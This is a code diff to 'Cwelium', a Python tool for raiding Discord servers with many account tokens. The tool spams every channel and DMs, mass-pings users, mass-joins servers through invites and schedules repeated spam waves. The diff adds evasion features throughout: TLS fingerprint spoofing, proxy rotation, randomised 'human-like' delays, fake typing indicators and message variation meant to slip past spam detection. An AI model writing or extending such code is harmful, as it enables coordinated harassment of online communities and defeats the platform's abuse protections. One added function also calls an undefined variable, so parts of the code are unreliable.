@@ -35,6 +35,18 @@ import websocket
 import orjson
 import concurrent.futures
 import json as json_lib
+import math
+from collections import defaultdict
+
+# ==================== curl_cffi で TLS フィンガープリントを偽装 ====================
+try:
+    import curl_cffi
+    USE_CURL_CFFI = True
+except ImportError:
+    USE_CURL_CFFI = False
+    print("[!] curl_cffi not installed. Install with: pip install curl_cffi")
+    print("[!] Without curl_cffi, your requests will be easily detected.")
+    print("[!] Continuing with requests (high risk of detection)...")
 
 # ==================== 設定ファイル ====================
 CONFIG_FILE = "config.json"
@@ -43,7 +55,24 @@ def load_config():
     if os.path.exists(CONFIG_FILE):
         with open(CONFIG_FILE, "r") as f:
             return orjson.loads(f.read())
-    return {"Proxies": False, "Theme": "light_blue"}
+    return {
+        "Proxies": True,
+        "Theme": "light_blue",
+        "DelayMean": 3.0,
+        "DelayStd": 1.0,
+        "MinDelay": 1.5,
+        "MaxDelay": 8.0,
+        "UseTyping": True,
+        "MessageVariation": True,
+        "JoinerRetries": 0,
+        "JoinerDelayMin": 10,
+        "JoinerDelayMax": 30,
+        "GlobalRateLimit": True,
+        "RateLimitPerSecond": 2,
+        "StatusRotation": True,
+        "StatusInterval": 300,
+        "CustomStatuses": ["Cwelium Raid", "Discord", "Auto"],
+    }
 
 def save_config(config):
     with open(CONFIG_FILE, "w") as f:
@@ -82,14 +111,6 @@ class JsonWrapper:
             fp.write(payload.decode())
 
 json = JsonWrapper()
-
-# ==================== グローバルセッション（requests） ====================
-global_session = requests.Session()
-global_session.headers.update({
-    "Accept": "*/*",
-    "Accept-Language": "en-US,en;q=0.9",
-    "Content-Type": "application/json",
-})
 
 def get_random_str(length):
     return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
@@ -139,14 +160,31 @@ class Files:
     def write_config():
         try:
             if not os.path.exists("config.json"):
-                data = {"Proxies": False, "Theme": "light_blue"}
+                data = {
+                    "Proxies": True,
+                    "Theme": "light_blue",
+                    "DelayMean": 3.0,
+                    "DelayStd": 1.0,
+                    "MinDelay": 1.5,
+                    "MaxDelay": 8.0,
+                    "UseTyping": True,
+                    "MessageVariation": True,
+                    "JoinerRetries": 0,
+                    "JoinerDelayMin": 10,
+                    "JoinerDelayMax": 30,
+                    "GlobalRateLimit": True,
+                    "RateLimitPerSecond": 2,
+                    "StatusRotation": True,
+                    "StatusInterval": 300,
+                    "CustomStatuses": ["Cwelium Raid", "Discord", "Auto"],
+                }
                 with open("config.json", "w") as f:
                     json.dump(data, f, indent=4)
         except Exception as e:
             console.log("Failed", C["red"], "Failed to Write Config", e)
     @staticmethod
     def write_folders():
-        folders = ["data", "scraped", "data/messages"]
+        folders = ["data", "scraped", "data/messages", "data/templates"]
         for folder in folders:
             try:
                 if not os.path.exists(folder):
@@ -172,9 +210,50 @@ class Files:
 Files.run_tasks()
 
 config = load_config()
-proxy = config.get("Proxies", False)
+proxy = config.get("Proxies", True)
 color = config.get("Theme", "light_blue")
+delay_mean = config.get("DelayMean", 3.0)
+delay_std = config.get("DelayStd", 1.0)
+min_delay = config.get("MinDelay", 1.5)
+max_delay = config.get("MaxDelay", 8.0)
+use_typing = config.get("UseTyping", True)
+message_variation = config.get("MessageVariation", True)
+joiner_retries = config.get("JoinerRetries", 0)
+joiner_delay_min = config.get("JoinerDelayMin", 10)
+joiner_delay_max = config.get("JoinerDelayMax", 30)
+global_rate_limit = config.get("GlobalRateLimit", True)
+rate_limit_per_second = config.get("RateLimitPerSecond", 2)
+status_rotation = config.get("StatusRotation", True)
+status_interval = config.get("StatusInterval", 300)
+custom_statuses = config.get("CustomStatuses", ["Cwelium Raid", "Discord", "Auto"])
 global_raider = None
+
+# ==================== グローバルレートリミッター ====================
+class GlobalRateLimiter:
+    def __init__(self):
+        self.buckets = defaultdict(list)  # endpoint -> list of request timestamps
+        self.lock = threading.Lock()
+        self.per_second = rate_limit_per_second
+
+    def can_request(self, endpoint):
+        if not global_rate_limit:
+            return True
+        with self.lock:
+            now = time.time()
+            # 1秒以内のリクエストをフィルタ
+            self.buckets[endpoint] = [t for t in self.buckets[endpoint] if now - t < 1.0]
+            if len(self.buckets[endpoint]) >= self.per_second:
+                return False
+            self.buckets[endpoint].append(now)
+            return True
+
+    def wait_if_needed(self, endpoint):
+        if not global_rate_limit:
+            return
+        while not self.can_request(endpoint):
+            time.sleep(0.05)
+
+global_rate_limiter = GlobalRateLimiter()
 
 class Render:
     def __init__(self):
@@ -222,12 +301,12 @@ class Render:
         self.title(f"Cwelium | Connected as {self.username} | made by Tips-Discord")
         edges = {"╗", "║", "╚", "╝", "═", "╔"}
         logo = [
-            " █████╗ ██╗    ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗",
-            "██╔══██╗██║    ██║██╔════╝██║     ██║██║   ██║████╗ ████║",
-            "██║  ██║██║ █╗ ██║█████╗  ██║     ██║██║   ██║██╔████╔██║",
-            "██║  ██║██║███╗██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║",
-            "╚█████╔╝╚███╔███╔╝███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║",
-            " ╚════╝  ╚══╝╚══╝ ╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝"
+            " ███╗   ███╗ █████╗ ███████╗██╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗██╗",
+            " ████╗ ████║██╔══██╗██╔════╝██║   ██║████╗ ████║██╔══██╗████╗  ██║██║",
+            " ██╔████╔██║███████║███████╗██║   ██║██╔████╔██║███████║██╔██╗ ██║██║",
+            " ██║╚██╔╝██║██╔══██║╚════██║██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║",
+            " ██║ ╚═╝ ██║██║  ██║███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║██║",
+            " ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝",
         ]
         height = len(logo)
         width = max(len(line) for line in logo)
@@ -259,8 +338,9 @@ class Render:
             "│ «04» Token Checker     «10» Guild Check        «16» Thread Spammer    «22» Onboard Bypass           │",
             "│ «05» Emoji Reaction    «11» Friend Spam        «17» Typer             «23» Dm Spammer               │",
             "│ «06» Clear Status      «12» ???                «18» ???               «24» Exit                     │",
-            "│ «25» Poll Spammer      «26» Mass Timeout       «27» Mass Nick All     «28» ???                      │",
+            "│ «25» Poll Spammer      «26» Mass Timeout       «27» Mass Nick All     «28» Schedule Spam            │",
             "│ «29» Ext Bot Setup     «30» Ext Bot Spam       «31» Ext Bot Status    «32» Token Quality            │",
+            "│ «33» Status Manager    «34» Adv Reaction       «35» Repeat Schedule   «36» ???                      │",
             "╰─────────────────────────────────────────────────────────────────────────────────────────────────────╯",
             "«h» Help   «~» Credits"
         ]
@@ -304,6 +384,12 @@ class Render:
         return prompted
 
 console = Render()
+
+if USE_CURL_CFFI:
+    try:
+        console.log("Info", C["cyan"], False, "curl_cffi enabled (TLS fingerprint spoofing)")
+    except:
+        pass
 
 class AutoFetchHeaders:
     user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9219 Chrome/138.0.7204.251 Electron/37.6.0 Safari/537.36"
@@ -532,106 +618,226 @@ def scrape(token, guild_id, channel_id):
     sb = DiscordSocket(token, guild_id, channel_id)
     return sb.run()
 
+# ============================================================================
+#  超強化 Raider クラス（全機能実装）
+# ============================================================================
 class Raider:
     def __init__(self):
         AutoFetchHeaders.fetch()
         self.cached_members = {}
-        # キャッシュ用のセッションは不要（グローバルセッションを使用）
+        self._sessions = {}
+        self._session_lock = threading.Lock()
+        self._proxy_pool = proxies if proxy else []
+        self._proxy_index = 0
+        self.status_thread_running = False
+        if USE_CURL_CFFI:
+            console.log("Info", C["cyan"], False, "curl_cffi enabled (TLS fingerprint spoofing)")
 
-    # ========== ヘッダー生成（最小限） ==========
+    # ========== プロキシローテーション ==========
+    def _get_next_proxy(self):
+        if not self._proxy_pool:
+            return None
+        self._proxy_index = (self._proxy_index + 1) % len(self._proxy_pool)
+        return self._proxy_pool[self._proxy_index]
+
+    # ========== TLS フィンガープリントをランダムに偽装（確実にサポートされているもの） ==========
+    def _get_impersonate(self):
+        safe_choices = [
+            "chrome110", "chrome120", "chrome124", "chrome136",
+            "edge101", "edge120",
+            "firefox102", "firefox128"
+        ]
+        return random.choice(safe_choices)
+
+    # ========== トークン専用セッション ==========
+    def get_session(self, token, force_new=False):
+        with self._session_lock:
+            if force_new or token not in self._sessions:
+                if USE_CURL_CFFI:
+                    try:
+                        impersonate = self._get_impersonate()
+                        self._sessions[token] = curl_cffi.Session(impersonate=impersonate)
+                    except Exception as e:
+                        console.log("Fallback", C["yellow"], f"{token[:15]}...", f"curl_cffi failed ({e}), using requests")
+                        self._sessions[token] = requests.Session()
+                        self._sessions[token].headers.update({"User-Agent": AutoFetchHeaders.user_agent})
+                else:
+                    self._sessions[token] = requests.Session()
+                    self._sessions[token].headers.update({"User-Agent": AutoFetchHeaders.user_agent})
+            return self._sessions[token]
+
+    # ========== プロキシ付きリクエスト（共通・グローバルレート制限付き） ==========
+    def _request(self, method, url, token, headers=None, json=None, params=None, timeout=10):
+        # グローバルレート制限をチェック
+        endpoint = url.split("/api/v9/")[-1] if "/api/v9/" in url else url
+        global_rate_limiter.wait_if_needed(endpoint)
+
+        sess = self.get_session(token)
+        if proxy and self._proxy_pool:
+            proxy_url = self._get_next_proxy()
+            sess.proxies = {"http": f"http://{proxy_url}", "https": f"http://{proxy_url}"}
+        else:
+            sess.proxies = {}
+        try:
+            resp = sess.request(
+                method=method,
+                url=url,
+                headers=headers,
+                json=json,
+                params=params,
+                timeout=timeout
+            )
+            return resp
+        except Exception as e:
+            console.log("Request Error", C["red"], f"{token[:15]}...", str(e))
+            raise
+
+    # ========== ヘッダー生成 ==========
     def headers_minimal(self, token):
-        """最小限のヘッダー（参加チェック・トークン検証用）"""
         return {
             "Authorization": token,
             "User-Agent": AutoFetchHeaders.user_agent,
             "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
         }
 
     def headers_full(self, token):
-        """フルヘッダー（メッセージ送信など、通常のAPI呼び出し用）"""
-        # Cookieやfingerprintは、curl_cffiでなくても必要ない場合が多いが、
-        # 念のため追加（ただし400が出る場合は最小限に戻す）
         return {
             "Authorization": token,
             "User-Agent": AutoFetchHeaders.user_agent,
             "Accept": "*/*",
             "Accept-Language": "en-US,en;q=0.9",
             "Content-Type": "application/json",
-            # cookieとfingerprintは必要に応じて追加（今回は最小限に）
+            "X-Super-Properties": self.generate_super_properties(),
+            "X-Debug-Options": "bugReporterEnabled",
+            "X-Discord-Locale": "en-US",
         }
+
+    def generate_super_properties(self):
+        payload = {
+            "os": "Windows",
+            "browser": "Discord Client",
+            "release_channel": "stable",
+            "client_version": AutoFetchHeaders.client_version,
+            "os_version": "10.0.26100",
+            "system_locale": "en-US",
+            "browser_user_agent": AutoFetchHeaders.user_agent,
+            "browser_version": AutoFetchHeaders.browser_version,
+            "client_build_number": AutoFetchHeaders.client_build_number,
+            "native_build_number": AutoFetchHeaders.native_build_number,
+            "client_launch_id": str(uuid.uuid4()),
+            "client_heartbeat_session_id": str(uuid.uuid4()),
+            "launch_signature": str(uuid.uuid4()),
+            "client_event_source": None,
+            "has_client_mods": False,
+        }
+        return base64.b64encode(json.dumps(payload).encode()).decode()
 
     def nonce(self):
         return int(time.time() * 1000) - 1420070400000 << 22
 
-    # ========== トークンの有効性チェック ==========
+    # ========== 人間らしい遅延（ジッター付き） ==========
+    def human_delay(self):
+        delay = random.gauss(delay_mean, delay_std)
+        delay = max(min_delay, min(delay, max_delay))
+        if random.random() < 0.3:
+            delay += random.uniform(0.5, 1.5)
+        time.sleep(delay)
+        return delay
+
+    # ========== メッセージバリエーション ==========
+    def vary_message(self, base_message):
+        if not message_variation:
+            return base_message
+        emojis = ["", "✨", "🔥", "💀", "🎯", "🚀", "💥", "⚡", "🌀", "🔰", "💫", "🌟"]
+        spacers = ["", " ", "  ", " - ", " | ", " • ", " · ", " ✦ "]
+        suffixes = ["", "", "", " (auto)", " #raid", " 🔥", " 💀", " 🚀"]
+        parts = [base_message]
+        if random.random() < 0.5:
+            parts.insert(0, random.choice(emojis))
+        if random.random() < 0.3:
+            parts.insert(1, random.choice(spacers))
+        if random.random() < 0.3:
+            parts.append(random.choice(suffixes))
+        random.shuffle(parts)
+        return "".join(parts).strip()
+
+    # ========== タイピングインジケーター ==========
+    def send_typing(self, token, channel_id):
+        if not use_typing:
+            return
+        try:
+            self._request("POST", f"https://discord.com/api/v9/channels/{channel_id}/typing",
+                          token, headers=self.headers_full(token), timeout=5)
+        except:
+            pass
+
+    # ========== トークン有効性 ==========
     def is_token_valid(self, token):
         try:
-            resp = global_session.get(
-                "https://discord.com/api/v9/users/@me",
-                headers=self.headers_minimal(token),
-                timeout=10
-            )
+            resp = self._request("GET", "https://discord.com/api/v9/users/@me",
+                                 token, headers=self.headers_minimal(token), timeout=10)
             return resp.status_code == 200
         except:
             return False
 
-    # ========== 参加チェック（/users/@me/guilds を使用） ==========
+    # ========== 参加チェック ==========
     def check_membership(self, token, guild_id):
-        """トークンが指定ギルドに参加しているか確認"""
         if not self.is_token_valid(token):
             console.log("Invalid Token", C["red"], f"{token[:15]}...", "Token is invalid")
             return False
         try:
-            resp = global_session.get(
-                "https://discord.com/api/v9/users/@me/guilds",
-                headers=self.headers_minimal(token),
-                timeout=10
-            )
+            resp = self._request("GET", "https://discord.com/api/v9/users/@me/guilds",
+                                 token, headers=self.headers_minimal(token), timeout=10)
             if resp.status_code == 200:
                 guilds = resp.json()
                 for guild in guilds:
                     if guild["id"] == guild_id:
                         return True
-                # ギルド一覧にはあるが対象が見つからない → 未参加
                 return False
+            elif resp.status_code == 429:
+                wait = resp.json().get('retry_after', 5) + random.uniform(0, 2)
+                console.log("Ratelimit", C["yellow"], f"{token[:15]}...", f"guilds wait {wait:.1f}s")
+                time.sleep(wait)
+                return self.check_membership(token, guild_id)
             else:
-                # フォールバック: /guilds/{guild_id}/members/@me を試す
-                resp2 = global_session.get(
-                    f"https://discord.com/api/v9/guilds/{guild_id}/members/@me",
-                    headers=self.headers_minimal(token),
-                    timeout=10
-                )
-                if resp2.status_code == 200:
-                    return True
-                else:
-                    console.log("Membership check failed", C["yellow"], f"{token[:15]}...", f"status {resp2.status_code}")
-                    return False
+                resp2 = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members/@me",
+                                      token, headers=self.headers_minimal(token), timeout=10)
+                return resp2.status_code == 200
         except Exception as e:
             console.log("Error in check_membership", C["red"], f"{token[:15]}...", str(e))
             return False
 
-    # ========== 有効トークン抽出（参加済みのみ） ==========
+    # ========== 有効トークン抽出（並列処理で高速化） ==========
     def get_valid_tokens_for_guild(self, guild_id):
-        valid = []
-        for token in tokens:
+        def check_token(token):
             if self.check_membership(token, guild_id):
-                valid.append(token)
-        console.log("Filtering Done", C["cyan"], False, f"Valid tokens in guild: {len(valid)}")
+                return token
+            return None
+
+        console.log("Filtering tokens (parallel)...", C["yellow"])
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            results = list(executor.map(check_token, tokens))
+
+        valid = [r for r in results if r is not None]
+        console.log("Filtering Done", C["cyan"], False, f"Valid tokens in guild: {len(valid)}/{len(tokens)}")
         if not valid:
-            console.log("Warning", C["yellow"], False, "No valid tokens found in guild. Run Token Checker (04).")
+            console.log("Warning", C["yellow"], False, "No valid tokens found in guild.")
         return valid
 
     # ========== テキストチャンネル取得 ==========
     def get_text_channels(self, token, guild_id):
         try:
-            resp = global_session.get(
-                f"https://discord.com/api/v9/guilds/{guild_id}/channels",
-                headers=self.headers_full(token),
-                timeout=10
-            )
+            resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels",
+                                 token, headers=self.headers_full(token), timeout=10)
             if resp.status_code == 200:
                 channels = resp.json()
                 return [c for c in channels if c.get('type') == 0]
+            elif resp.status_code == 429:
+                wait = resp.json().get('retry_after', 5) + random.uniform(0, 2)
+                console.log("Ratelimit", C["yellow"], f"{token[:15]}...", f"channels wait {wait:.1f}s")
+                time.sleep(wait)
+                return self.get_text_channels(token, guild_id)
             else:
                 console.log("Failed to get channels", C["red"], f"{token[:15]}...", f"status {resp.status_code}")
                 return []
@@ -639,9 +845,13 @@ class Raider:
             console.log("Error get_text_channels", C["red"], f"{token[:15]}...", str(e))
             return []
 
-    # ========== メッセージ送信（リトライ付き） ==========
+    # ========== メッセージ送信（権限不足は即座に諦める） ==========
     def send_message(self, token, channel_id, content, poll=None):
-        payload = {"content": content}
+        if random.random() < 0.6:
+            self.send_typing(token, channel_id)
+            time.sleep(random.uniform(0.3, 0.8))
+        varied_content = self.vary_message(content)
+        payload = {"content": varied_content}
         if poll:
             payload["poll"] = {
                 "question": {"text": poll["question"]},
@@ -649,30 +859,29 @@ class Raider:
                 "duration": 24,
                 "allow_multiselect": False
             }
-        for attempt in range(3):
+        for attempt in range(2):  # 最大1回リトライ（429の場合のみ）
             try:
-                resp = global_session.post(
-                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
-                    headers=self.headers_full(token),
-                    json=payload,
-                    timeout=10
-                )
+                resp = self._request("POST", f"https://discord.com/api/v9/channels/{channel_id}/messages",
+                                     token, headers=self.headers_full(token), json=payload, timeout=10)
                 if resp.status_code == 200:
-                    console.log("Sent", C["green"], f"{token[:15]}...", f"Ch {channel_id}" + (" (poll)" if poll else ""))
                     return True
                 elif resp.status_code == 429:
-                    wait = resp.json().get('retry_after', 5) + random.uniform(0, 2)
+                    wait = resp.json().get('retry_after', 3) + random.uniform(0, 1)
                     console.log("Ratelimit", C["yellow"], f"{token[:15]}...", f"wait {wait:.1f}s")
                     time.sleep(wait)
+                    continue
+                elif resp.status_code in (400, 403):
+                    console.log("No permission", C["gray"], f"{token[:15]}...", f"Ch {channel_id} ({resp.status_code})")
+                    return False
                 else:
                     console.log("Failed", C["red"], f"{token[:15]}...", f"Ch {channel_id} ({resp.status_code})")
                     return False
             except Exception as e:
                 console.log("Error send_message", C["red"], f"{token[:15]}...", str(e))
-                time.sleep(1)
+                return False
         return False
 
-    # ========== サーバー全体スパマー（無限ループ） ==========
+    # ========== サーバー全体スパマー（喋れないチャンネルを自動スキップ） ==========
     def guild_spammer(self, token, guild_id, message, pings, delay, poll=None):
         if not self.check_membership(token, guild_id):
             console.log("Skip", C["gray"], f"{token[:15]}...", "not in guild")
@@ -682,16 +891,25 @@ class Raider:
             console.log("Info", C["yellow"], f"{token[:15]}...", "no text channels")
             return
         console.log("Started", C["green"], f"{token[:15]}...", f"{len(channels)} channels")
+        active_channels = channels.copy()
+
         while not SHOULD_STOP:
-            for ch in channels:
+            random.shuffle(active_channels)
+            for ch in active_channels[:]:
                 if SHOULD_STOP:
                     break
-                content = ("@everyone " * pings) + message if pings > 0 else message
-                self.send_message(token, ch['id'], content, poll)
-                time.sleep(random.uniform(0.3, 0.8))
-            console.log("Cycle Done", C["cyan"], f"{token[:15]}...", f"{len(channels)} channels")
+                success = self.send_message(token, ch['id'], message, poll)
+                if not success:
+                    console.log("Removing channel", C["gray"], f"{token[:15]}...", f"Ch {ch['id']} (no permission)")
+                    active_channels.remove(ch)
+                    continue
+                self.human_delay()
+            if not active_channels:
+                console.log("Stopped", C["yellow"], f"{token[:15]}...", "No writable channels left")
+                return
+            console.log("Cycle Done", C["cyan"], f"{token[:15]}...", f"{len(active_channels)} channels remaining")
             if delay > 0:
-                time.sleep(delay)
+                time.sleep(delay + random.uniform(0, 3))
 
     # ========== 単一チャンネルスパマー ==========
     def spammer(self, token, channel_id, message, guild=None, massping=None,
@@ -707,33 +925,32 @@ class Raider:
                 content += f" {members}" if members else ""
             if random_str:
                 content += f" | {get_random_str(10)}"
-            self.send_message(token, channel_id, content, poll)
+            success = self.send_message(token, channel_id, content, poll)
+            if not success:
+                console.log("Stopped", C["yellow"], f"{token[:15]}...", "No permission on this channel")
+                return
             if delay:
-                time.sleep(delay)
+                time.sleep(delay + random.uniform(0, 2))
             else:
-                time.sleep(random.uniform(0.5, 1.5))
+                self.human_delay()
 
-    # ========== メンバー取得（scrape） ==========
+    # ========== メンバー取得 ==========
     def member_scrape(self, guild_id, channel_id):
         try:
             if channel_id is None:
-                # 最初のテキストチャンネルを取得
                 for token in tokens:
-                    resp = global_session.get(
-                        f"https://discord.com/api/v9/guilds/{guild_id}/channels",
-                        headers=self.headers_full(token),
-                        timeout=10
-                    )
+                    resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels",
+                                         token, headers=self.headers_full(token), timeout=5)
                     if resp.status_code == 200:
                         channels = resp.json()
                         text_channels = [c for c in channels if c.get('type') == 0]
                         if text_channels:
                             channel_id = text_channels[0]['id']
                             break
+                    self.human_delay()
                 if channel_id is None:
                     console.log("Failed", C["red"], "No text channel found")
                     return
-            # 有効なトークンを取得
             valid_tokens = self.get_valid_tokens_for_guild(guild_id)
             if not valid_tokens:
                 console.log("Failed", C["red"], "No valid token in guild")
@@ -764,73 +981,126 @@ class Raider:
         selected = random.sample(members, min(count, len(members)))
         return " ".join(f"<@!{uid}>" for uid in selected)
 
-    # ========== トークン品質チェック（32） ==========
-    def token_quality_check(self):
-        console.clear()
-        console.render_ascii()
-        console.title("Cwelium - Token Quality Check")
-        console.log("Checking", C["yellow"], False, "Token quality analysis...")
-        results = []
-        for token in tokens:
-            try:
-                resp = global_session.get(
-                    "https://discord.com/api/v9/users/@me",
-                    headers=self.headers_minimal(token),
-                    timeout=10
-                )
-                if resp.status_code == 200:
-                    user = resp.json()
-                    guild_resp = global_session.get(
-                        "https://discord.com/api/v9/users/@me/guilds",
-                        headers=self.headers_minimal(token),
-                        timeout=10
-                    )
-                    guild_count = len(guild_resp.json()) if guild_resp.status_code == 200 else 0
-                    lib_resp = global_session.get(
-                        "https://discord.com/api/v9/users/@me/library",
-                        headers=self.headers_minimal(token),
-                        timeout=10
-                    )
-                    locked = (lib_resp.status_code == 403)
-                    results.append({
-                        "token": token[:25] + "...",
-                        "username": user.get("username", "Unknown"),
-                        "verified": user.get("verified", False),
-                        "email": user.get("email", "None"),
-                        "guilds": guild_count,
-                        "locked": locked,
-                        "status": "Valid"
-                    })
-                elif resp.status_code == 401:
-                    results.append({"token": token[:25] + "...", "status": "Invalid (401)"})
-                elif resp.status_code == 403:
-                    results.append({"token": token[:25] + "...", "status": "Locked (403)"})
-                else:
-                    results.append({"token": token[:25] + "...", "status": f"Unknown ({resp.status_code})"})
-                time.sleep(0.5)
-            except Exception as e:
-                results.append({"token": token[:25] + "...", "status": f"Error: {e}"})
-        console.clear()
-        console.render_ascii()
-        print(f"\n{C['cyan']}【 Token Quality Report 】{C['white']}\n")
-        for res in results:
-            if "Valid" in res.get("status", ""):
-                status_color = C["green"]
-                extra = f" | @{res.get('username','')} | Verified:{res.get('verified',False)} | Guilds:{res.get('guilds',0)} | Locked:{res.get('locked',False)}"
-            elif "Invalid" in res.get("status", ""):
-                status_color = C["red"]
-                extra = ""
-            elif "Locked" in res.get("status", ""):
-                status_color = C["yellow"]
-                extra = ""
-            else:
-                status_color = C["gray"]
-                extra = ""
-            console.log(res["status"], status_color, res["token"], extra)
-        input(f"\n   {console.background}~/> press enter to continue ")
-        Menu().main_menu()
+    # ========== スケジュールスパム（基本） ==========
+    def schedule_spam(self, guild_id, channel_id, message, schedule_time, tokens_list):
+        now = datetime.now()
+        target = datetime.strptime(schedule_time, "%H:%M").replace(year=now.year, month=now.month, day=now.day)
+        if target < now:
+            target += timedelta(days=1)
+        wait_seconds = (target - now).total_seconds()
+        console.log("Schedule", C["yellow"], False, f"Spam will start at {target.strftime('%H:%M')} (in {wait_seconds:.0f}s)")
+        time.sleep(wait_seconds)
+        console.log("Schedule", C["green"], False, "Starting scheduled spam!")
+        for token in tokens_list:
+            threading.Thread(target=self.guild_spammer, args=(token, guild_id, message, 0, 0, None)).start()
 
-    # ========== 以下、他の機能（簡略化、すべて requests 化） ==========
+    # ========== 繰り返しスケジュール（新機能） ==========
+    def repeat_schedule_spam(self, guild_id, channel_id, message, schedule_time, interval_minutes, tokens_list, max_runs=0):
+        def run_loop():
+            runs = 0
+            while not SHOULD_STOP and (max_runs == 0 or runs < max_runs):
+                now = datetime.now()
+                target = datetime.strptime(schedule_time, "%H:%M").replace(year=now.year, month=now.month, day=now.day)
+                if target < now:
+                    target += timedelta(days=1)
+                wait_seconds = (target - now).total_seconds()
+                console.log("Repeat Schedule", C["yellow"], False, f"Next run at {target.strftime('%H:%M')} (in {wait_seconds:.0f}s)")
+                time.sleep(wait_seconds)
+                console.log("Repeat Schedule", C["green"], False, f"Starting scheduled spam (run {runs+1})")
+                for token in tokens_list:
+                    threading.Thread(target=self.guild_spammer, args=(token, guild_id, message, 0, 0, None)).start()
+                runs += 1
+                # 次の実行まで待機（インターバル分）
+                if max_runs == 0 or runs < max_runs:
+                    time.sleep(interval_minutes * 60)
+        threading.Thread(target=run_loop, daemon=True).start()
+
+    # ========== ステータス管理（新機能） ==========
+    def status_manager(self):
+        if not status_rotation:
+            return
+        def rotate_status():
+            while not SHOULD_STOP:
+                try:
+                    status = random.choice(custom_statuses)
+                    # WebSocketでステータスを更新
+                    ws = websocket.WebSocket()
+                    ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
+                    # 認証とステータス設定
+                    for token in tokens:
+                        try:
+                            ws.send(json.dumps({
+                                "op": 2,
+                                "d": {
+                                    "token": token,
+                                    "properties": {"os": "Windows", "browser": "Discord"},
+                                    "presence": {
+                                        "status": random.choice(['online', 'idle', 'dnd']),
+                                        "since": 0,
+                                        "activities": [{"name": status, "type": 0}],
+                                        "afk": False
+                                    }
+                                }
+                            }))
+                            console.log("Status Updated", C["green"], f"{token[:15]}...", status)
+                            time.sleep(1)
+                        except Exception as e:
+                            console.log("Status Error", C["red"], f"{token[:15]}...", str(e))
+                    ws.close()
+                except Exception as e:
+                    console.log("Status Manager Error", C["red"], False, str(e))
+                time.sleep(status_interval)
+        threading.Thread(target=rotate_status, daemon=True).start()
+
+    # ========== 高度なリアクション（新機能） ==========
+    def advanced_reaction(self, channel_id, target_type, target_value, emoji):
+        """
+        target_type: 'user', 'keyword', 'message_id'
+        target_value: user_id, keyword, or message_id
+        """
+        try:
+            if target_type == "message_id":
+                # 特定メッセージにリアクション
+                self._request("PUT", f"https://discord.com/api/v9/channels/{channel_id}/messages/{target_value}/reactions/{emoji}/@me",
+                              token=None, headers=self.headers_full(token))  # 全トークンで実行
+                console.log("Advanced Reaction", C["green"], False, f"Reacted to message {target_value}")
+                return
+            # チャンネルメッセージを取得
+            resp = self._request("GET", f"https://discord.com/api/v9/channels/{channel_id}/messages",
+                                 token=tokens[0], headers=self.headers_full(tokens[0]), params={"limit": 50}, timeout=10)
+            if resp.status_code != 200:
+                console.log("Failed to fetch messages", C["red"])
+                return
+            messages = resp.json()
+            target_msg = None
+            if target_type == "user":
+                for msg in messages:
+                    if msg["author"]["id"] == target_value:
+                        target_msg = msg
+                        break
+            elif target_type == "keyword":
+                for msg in messages:
+                    if target_value.lower() in msg.get("content", "").lower():
+                        target_msg = msg
+                        break
+            if not target_msg:
+                console.log("No matching message found", C["yellow"])
+                return
+            msg_id = target_msg["id"]
+            # 全トークンでリアクション
+            def react(token):
+                try:
+                    self._request("PUT", f"https://discord.com/api/v9/channels/{channel_id}/messages/{msg_id}/reactions/{emoji}/@me",
+                                  token, headers=self.headers_full(token), timeout=10)
+                    console.log("Reacted", C["green"], f"{token[:15]}...", emoji)
+                except:
+                    pass
+            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+                executor.map(react, tokens)
+        except Exception as e:
+            console.log("Advanced Reaction Error", C["red"], False, str(e))
+
+    # ========== 強化合体（キャプチャ時は即座に諦める） ==========
     def joiner(self, invite):
         try:
             params = {
@@ -841,12 +1111,8 @@ class Raider:
             }
             invite_info = None
             for token in tokens:
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/invites/{invite}",
-                    headers=self.headers_minimal(token),
-                    params=params,
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/invites/{invite}",
+                                     token, headers=self.headers_full(token), params=params, timeout=10)
                 if resp.status_code == 200:
                     invite_info = resp.json()
                     break
@@ -855,6 +1121,7 @@ class Raider:
                     input()
                     Menu().main_menu()
                     return
+                self.human_delay()
             if not invite_info:
                 console.log("Failed", C["red"], "Could not retrieve invite info")
                 input()
@@ -871,40 +1138,38 @@ class Raider:
                 "location_channel_type": channel_type
             }
             context = base64.b64encode(json.dumps(join).encode()).decode()
+
             def join_server(token):
-                try:
-                    time.sleep(random.uniform(0.5, 3.0))
-                    headers = self.headers_full(token)
-                    headers["X-Context-Properties"] = context
-                    payload = {"session_id": uuid.uuid4().hex}
-                    resp = global_session.post(
-                        f"https://discord.com/api/v9/invites/{invite}",
-                        headers=headers,
-                        json=payload,
-                        timeout=10
-                    )
-                    if resp.status_code == 200:
-                        console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
-                    elif resp.status_code == 400:
-                        console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "Retrying...")
-                        time.sleep(random.uniform(5, 10))
-                        retry = global_session.post(
-                            f"https://discord.com/api/v9/invites/{invite}",
-                            headers=headers,
-                            json=payload,
-                            timeout=10
-                        )
-                        if retry.status_code == 200:
-                            console.log("Joined (retry)", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
+                max_retries = joiner_retries
